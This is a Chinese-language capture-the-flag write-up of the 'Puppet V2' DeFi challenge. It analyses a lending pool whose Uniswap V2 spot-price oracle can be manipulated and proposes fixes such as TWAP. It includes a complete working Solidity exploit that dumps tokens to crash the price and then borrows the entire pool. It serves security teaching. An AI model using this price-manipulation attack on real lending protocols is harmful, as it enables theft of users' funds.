# Puppet V2 
## 一、题目简介

本题是 Puppet V1 的迭代版本，开发者针对 V1 漏洞进行了表层修复，将价格预言机从 Uniswap V1 升级为 **Uniswap V2**，并使用官方标准库 `UniswapV2Library` 计算代币价格，同时调整了借贷抵押规则与资产类型。

合约核心规则：用户借贷 DVT 代币，需要抵押 **3倍代币价值的 WETH**，合约仅接收 WETH 作为抵押物，不再接收原生 ETH。价格完全依赖 Uniswap V2 交易对瞬时储备量计算。

基础环境参数：

- 借贷池风险资产：**1000000 DVT**

- Uniswap V2 交易对：低流动性池子

- 玩家初始资产：**20 ETH、10000 DVT**

解题目标：掏空借贷池内全部 DVT 代币，并将所有代币存入指定 recovery 回收账户。

## 二、审计视角

### 1\. 核心漏洞：Uniswap V2 瞬时储备预言机可控

合约通过官方 V2 库读取交易对实时储备，计算代币美元价格，无任何防护机制：

```solidity
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

漏洞细节：**官方库不等于安全**，该逻辑仅读取链上瞬时区块储备，属于单点快照价格。低流动性池子下，攻击者单次大额兑换即可彻底篡改储备比例，操控代币价格。

### 2\. 抵押风控逻辑完全依附可控预言机

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}
```

漏洞细节：借贷所需抵押的 WETH 数量，完全由可被操控的预言机价格决定。攻击者砸盘压低 DVT 价格后，3倍抵押倍率的风控规则形同虚设，抵押成本近乎归零。

### 3\. 业务风控缺失严重

合约仅校验用户抵押物是否充足，未做任何兜底风控：无交易对流动性深度校验、无价格熔断机制、无单次借贷限额、无价格波动校验，完全信任外部 AMM 数据源。

## 三、开发者默认安全假设

1. **工具迷信**：错误认为升级 Uniswap V2 \+ 使用官方标准库，即可杜绝价格操纵漏洞。

2. **机制认知缺失**：不理解 Uniswap V2 瞬时储备价格依旧可被操纵，未区分「瞬时价格」与「TWAP 加权价格」。

3. **倍率风控迷信**：认为提升抵押倍率至3倍，可抵御套利攻击，忽略价格源头可控的核心问题。

4. **无兜底安全设计**：未增加流动性校验、价格熔断、借贷限额等多层风控机制。

## 四、同类项目通用审计盯点（重点）

1. **预言机核心禁忌**：所有借贷、清算、杠杆类金融合约，**禁止使用 Uniswap V1/V2 瞬时储备作为价格预言机**。

2. **工具不等于安全**：官方开源库仅保证计算逻辑无误，无法抵御业务逻辑漏洞与价格攻击。

3. **流动性校验必查**：接入 AMM 价格源前，必须校验交易对流动性深度，低深度池子禁止作为价格数据源。

4. **优先使用 TWAP**：Uniswap V2 生态必须采用时间加权平均价格，抹平区块级瞬时价格操纵。

5. **多层风控兜底**：抵押倍率、价格熔断、单笔限额、多预言机交叉校验缺一不可。

## 五、完整解题思路

1. **资产转换**：合约仅支持 WETH 抵押，首先将玩家原生 ETH 兑换为 WETH。

2. **代币砸盘**：授权并卖出玩家全部 10000 DVT，利用池子低流动性，大幅压低 DVT 链上价格。

3. **降低抵押成本**：预言机读取篡改后的储备数据，DVT 价格趋近于0，借贷所需 WETH 抵押物近乎免费。

4. **掏空资金池**：授权 WETH 给借贷合约，一次性借走池中全部 1000000 DVT。

5. **完成通关**：将所有盗取的 DVT 转账至官方 recovery 回收账户，满足通关条件。

## 六、报错复盘

### 报错1：vm\.startPrank: cannot overwrite a prank

**报错原因**：测试框架 `checkSolvedByPlayer` 修饰器会自动完成玩家 prank，重复调用会直接报错。

**解决方案**：删除所有手动 `startPrank/stopPrank` 代码。

### 报错2：Unused local variable 警告

**报错原因**：定义了抵押数量变量但未使用，代码冗余。

**解决方案**：删除冗余变量，精简代码。

## 七、完整可通关 EXP（零报错、官方适配）

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // 1. 将原生 ETH 兑换为合约所需的 WETH
    weth.deposit{value: player.balance}();

    // 2. 授权 DVT 代币给 V2 路由，用于砸盘兑换
    token.approve(address(uniswapV2Router), type(uint256).max);

    // 3. 构造 DVT -> WETH 兑换路径
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    // 4. 卖出全部玩家 DVT，砸低代币预言机价格
    uniswapV2Router.swapExactTokensForTokens(
        PLAYER_INITIAL_TOKEN_BALANCE,
        1,
        path,
        player,
        block.timestamp + 1000
    );

    // 5. 授权 WETH 给借贷池，用于抵押借贷
    weth.approve(address(lendingPool), type(uint256).max);

    // 6. 一次性借光池子所有 DVT
    uint256 borrowAmount = POOL_INITIAL_TOKEN_BALANCE;
    lendingPool.borrow(borrowAmount);

    // 7. 转移全部代币至回收账户，完成解题
    token.transfer(recovery, borrowAmount);
}
```

## 八、合约修复方案

1. **替换预言机机制**：废弃瞬时储备定价，接入 Uniswap V2 TWAP 时间加权平均价格，抵抗单区块价格操纵。

2. **增加流动性校验**：获取预言机价格前，校验交易对流动性，低于阈值则暂停借贷服务。

3. **新增价格熔断机制**：监控单区块价格浮动比例，价格剧烈波动时触发熔断，禁止借贷。

4. **限制借贷额度**：添加单笔、单用户借贷上限，防止资金池被一次性掏空。

5. **多源预言机交叉校验**：接入多个去中心化预言机，规避单点数据源被操控的风险。

## 九、漏洞总结

Puppet V2 证明了：**底层漏洞与工具版本无关**。即便升级 Uniswap 版本、使用官方库、提升抵押倍率，只要依赖 AMM 瞬时快照价格作为金融风控依据，浅流动性池子就一定会被价格操纵，最终导致合约资金被完全掏空。

